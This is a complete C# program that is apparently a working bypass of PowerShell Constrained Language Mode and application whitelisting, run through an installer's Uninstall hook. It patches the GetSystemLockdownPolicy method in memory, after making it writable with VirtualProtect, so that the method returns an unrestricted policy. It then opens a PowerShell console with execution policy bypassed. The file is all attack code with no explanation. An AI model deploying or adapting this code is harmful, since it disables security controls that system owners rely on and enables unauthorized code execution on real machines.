using System;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;

namespace bypass
{

    class Program
    {

        public static void Main(string[] args)
        {
            Console.WriteLine("");
        }

    }
    [System.ComponentModel.RunInstaller(true)]
    public class real : System.Configuration.Install.Installer
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetStdHandle(int nStdHandle);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            var auto = typeof(System.Management.Automation.Alignment).Assembly;
            var lockdown = auto.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            var ld_handle = lockdown.MethodHandle;
            uint protect;
            RuntimeHelpers.PrepareMethod(ld_handle);
            var ld_ptr = ld_handle.GetFunctionPointer();
            VirtualProtect(ld_ptr, new UIntPtr(4), 0x40, out protect);
            var patch = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
            Marshal.Copy(patch, 0, ld_ptr, 4);
            Microsoft.PowerShell.ConsoleShell.Start(System.Management.Automation.Runspaces.RunspaceConfiguration.Create(), "Banner", "Help", new string[] {
                "-exec", "bypass", "-nop"
            });
        }
    }
}